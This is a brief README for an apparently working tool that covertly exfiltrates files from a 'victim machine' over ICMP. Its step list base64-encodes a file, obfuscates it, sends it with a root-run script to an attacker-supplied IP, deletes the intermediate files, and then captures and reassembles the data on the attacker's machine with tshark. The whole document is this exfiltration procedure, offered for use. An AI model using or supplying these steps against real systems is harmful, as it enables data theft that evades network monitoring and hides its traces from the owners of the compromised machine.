# ICMP Encrypt Message

Small project to send files encoded and obfuscated over ICMP as a secondary means of communication.

It's required to have root access in the victim machine.

The obfuscation method can be changed. Just edit *obfuscador.py* and *deObfuscador.py* to something that fits your needs.

Steps:
```
[Victim Machine]
    cat <file to send> | base64 > token
    python ofuscador.py token tmp
    rm token
    (sudo) python icmp.py <ip to send the file> tmp # You need to run this as root
    rm tmp

[Attacker Machine]
    (sudo) tshark -i lo -f 'icmp[0] == 8' -e data -Tjson > tout.json # You need to run this as root
    ./getFileBack.sh <final File>
```

